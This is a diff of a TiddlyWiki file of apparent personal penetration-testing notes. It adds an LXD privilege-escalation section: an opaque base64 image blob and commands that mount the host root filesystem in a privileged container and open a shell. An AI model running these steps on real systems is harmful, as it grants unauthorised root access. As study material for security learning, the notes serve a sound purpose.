@@ -9672,7 +9672,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211020124200114" list="[[Cyber Security]] [[Privilege Escalation]] CrappyMakerProgrammer Tech Operations/IT" modified="20211020163624353" title="$:/StoryList">
+<div created="20211022023120284" list="[[Cyber Security]] [[Privilege Escalation]] CrappyMakerProgrammer" modified="20211022023126804" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11758,7 +11758,7 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 <div created="20211014102800712" modified="20211014102802344" title="Privesc - Linux Binaries">
 <pre>https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</pre>
 </div>
-<div created="20210904164116778" modified="20211020163658948" title="Privilege Escalation">
+<div created="20210904164116778" modified="20211022023644873" title="Privilege Escalation">
 <pre>! Linux
 
 [[Privesc - Linux Binaries]]
@@ -11781,8 +11781,27 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ## eg. Python Library Injection
 ## C Library Injection
 
-LXD [[*|https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation]]
+!! LXD 
 
+Overall guide [[*|https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation]]
+
+Can use this image [[*|https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1]]
+
+```
+cd /dev/shm # Important so that lxc can access your files (if its snap)
+echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &gt; bob.tar.bz2
+```
+
+Generic way to import lxc image from file
+
+```
+lxd init
+lxc image import bob.tar.bz2 --alias bobImage
+lxc init bobImage bobVM -c security.privileged=true
+lxc config device add bobVM realRoot disk source=/ path=r
+lxc start bobVM
+lxc exec bobVM -- /bin/sh
+```
 
 ! Windows
 
